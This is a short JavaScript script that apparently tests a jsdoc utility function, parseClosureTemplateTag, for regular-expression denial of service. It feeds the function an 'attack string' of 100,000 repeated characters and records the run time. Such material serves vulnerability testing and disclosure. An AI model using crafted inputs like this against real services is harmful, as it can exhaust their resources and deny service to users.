import { parseClosureTemplateTag } from "./jsdocUtils.js";

//Attack String :"[ "+"a"*100000+"◎"
var str = "[ ";
for (var i = 0; i < 100000; i++) {
  str += "a";
}
str += "◎";

const tag = {
  name: str,
};
console.log(parseClosureTemplateTag(tag));

// real    0m0.173s
// user    0m0.113s
// sys     0m0.031s
